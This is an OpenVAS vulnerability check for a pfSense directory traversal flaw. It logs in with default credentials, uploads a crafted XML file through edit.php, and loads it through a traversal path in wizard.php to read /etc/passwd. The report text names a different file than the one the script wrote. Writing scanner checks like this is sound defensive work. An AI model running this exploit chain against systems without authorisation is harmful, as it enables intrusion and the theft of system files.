###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pfsense_wizard_xml_dir_trav_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# PFSense Wizard XML Directory Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:pfsense:pfsense';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806806");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-01-14 18:46:02 +0530 (Thu, 14 Jan 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("PFSense Wizard XML Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running pfsense and is prone to
  directory traversal attack.");

  script_tag(name:"vuldetect", value:"Send a crafted xml file via HTTP POST and
  check whether we can gain command execution.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - wizard.php file do not sanitize the path of the xml parameter
    and we can load xml files

  - pkg.php file do not sanitize the path of the xml parameter
    and we can load xml files");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to obtain access by leveraging knowledge of the credentials and
  launch further attacks including XML External Entity Injection.");

  script_tag(name:"affected", value:"pfsense 2.2.5 and earlier");

  script_tag(name:"solution", value:"Apply the fix provided by the vendor via the references.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Dec/78");
  script_xref(name:"URL", value:"https://github.com/pfsense/pfsense/commit/3ac0284805ce357552c3ccaeff0a9aadd0c6ea13");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_pfsense_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("pfsense/http/installed");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!nmsPort = get_app_port(cpe:CPE, service:"www")){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:nmsPort)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:nmsPort);

url = dir  + "/index.php";
req1 = http_get(item:url, port:nmsPort);
res1 = http_keepalive_send_recv(port:nmsPort, data:req1);

if(res1 && "PHPSESSID" >< res1)
{
  cookie1 = eregmatch(pattern:"PHPSESSID=([0-9a-zA-Z]+);", string:res1);
  if(!cookie1[1]){
    exit(0);
  }

  sid = eregmatch( pattern:"sid:([a-zA-Z0-9\,a-zA-Z0-9]+)", string:res1);
  if(sid){
   fp = split(sid[1], sep:",", keep:FALSE);
  }

  post_data = '__csrf_magic=sid%3A'+fp[0]+'%2C'+fp[1]+'&usernamefld=admin&passwordfld=pfsense&login=Login';
  len = strlen(post_data);

  req2 =  'POST ' + url + ' HTTP/1.1\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Host: ' + host + '\r\n' +
          'Cookie: PHPSESSID=' + cookie1[1] + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
          'Content-Length: ' + len + '\r\n' +
          '\r\n' +
          post_data;
  res2 =  http_keepalive_send_recv(port:nmsPort, data:req2);

  if('HTTP/1.1 302 Found' >!< res2){
    exit(0);
  }

  cookie2 = eregmatch( pattern:"PHPSESSID=([0-9a-zA-Z]+);", string:res2 );
  if(!cookie2[1]){
    exit(0);
  }

  url = dir + '/edit.php';
  req3 =  'GET ' + url + ' HTTP/1.1\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Host: ' + host + '\r\n' +
          'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
          '\r\n';

  res3 = http_keepalive_send_recv(port:nmsPort, data:req3);
  if(res3 && "sid" >< res3){
     sid2 = eregmatch( pattern:"sid:([a-zA-Z0-9\,a-zA-Z0-9]+)", string:res3 );
  }

  if(!sid2[0]){
   exit(0);
  }


  post_data2 ='__csrf_magic='+sid2[0]+'&action=save&file=/obc.xml&data=PD94bWwg' +
              'dmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiID8%2BCjxwZnNlbnNld2l6YX' +
            'JkPgo8dG90YWxzdGVwcz4xMjwvdG90YWxzdGVwcz4KPHN0ZXA%2BCjxpZD4xPC9p' +
            'ZD4KPHRpdGxlPkxGSSBleGFtcGxlIDwvdGl0bGU%2BCjxkZXNjcmlwdGlvbj5MZm' +
            'kgZXhhbXBsZSA8L2Rlc2NyaXB0aW9uPgo8ZGlzYWJsZWhlYWRlcj5vbjwvZGlzYW' +
            'JsZWhlYWRlcj4KPHN0ZXBzdWJtaXRwaHBhY3Rpb24%2Bc3RlcDFfc3VibWl0cGhw' +
            'YWN0aW9uKCk7PC9zdGVwc3VibWl0cGhwYWN0aW9uPgo8aW5jbHVkZWZpbGU%2BL2' +
            'V0Yy9wYXNzd2Q8L2luY2x1ZGVmaWxlPgo8L3N0ZXA%2BCjwvcGZzZW5zZXdpemFy' +
            'ZD4=';
  len2=strlen(post_data2);

  url = dir + '/edit.php';
  req4 =  'POST ' + url + ' HTTP/1.1\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Host: ' + host + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n' +
          'X-Requested-With: XMLHttpRequest\r\n' +
          'Referer: https://' + host + '/edit.php\r\n' +
          'Content-Length: ' + len2 + '\r\n' +
          'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
          '\r\n' +
          post_data2;

  res4 =  http_keepalive_send_recv(port:nmsPort, data:req4);

  if("File successfully saved" >< res4)
  {

    ## trigger the uploaded file to confirm vulnerability

    url = dir + '/wizard.php?xml=../../../../../../../obc.xml';

    req5 =  'GET ' + url + ' HTTP/1.1\r\n' +
            'User-Agent: ' + useragent + '\r\n' +
            'Host: ' + host + '\r\n' +
            'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
            'Connection: keep-alive\r\n' +
            '\r\n';

    res5 = http_keepalive_send_recv(port:nmsPort, data:req5);
    if('root' >!< res5){
      exit(0);
    }


    ## Empty the content of uploaded file
    url = dir + '/edit.php';
    req6 =  'GET ' + url + ' HTTP/1.1\r\n' +
            'User-Agent: ' + useragent + '\r\n' +
            'Host: ' + host + '\r\n' +
            'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
            '\r\n';

    res6 = http_keepalive_send_recv(port:nmsPort, data:req6);
    if(res6 && "sid" >< res6){
      sid3 = eregmatch( pattern:"sid:([a-zA-Z0-9\,a-zA-Z0-9]+)", string:res6);
    }

    post_data3 ='__csrf_magic='+sid3[0]+'&action=save&file=/obc.xml&data=';
    len3 = strlen(post_data3);

    url = dir + '/edit.php';
    req7 =  'POST ' + url + ' HTTP/1.1\r\n' +
            'User-Agent: ' + useragent + '\r\n' +
            'Host: ' + host + '\r\n' +
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n' +
            'X-Requested-With: XMLHttpRequest\r\n' +
            'Referer: https://' + host + '/edit.php\r\n' +
            'Content-Length: ' + len3 + '\r\n' +
            'Cookie: PHPSESSID=' + cookie2[1] + '\r\n' +
            '\r\n' +
            post_data3;
    res7 = http_keepalive_send_recv(port:nmsPort, data:req7);
    if("File successfully saved" >!< res7){
      exit(0);
    }

    if(('root' >< res5) && ("File successfully saved" >< res7))
    {
      report = report_vuln_url( port:nmsPort, url:url );
      report = report + "\r\nPlease remove the ovs.xml file manually from the application";
      security_message(port:nmsPort, data:report);
    }
  }
}
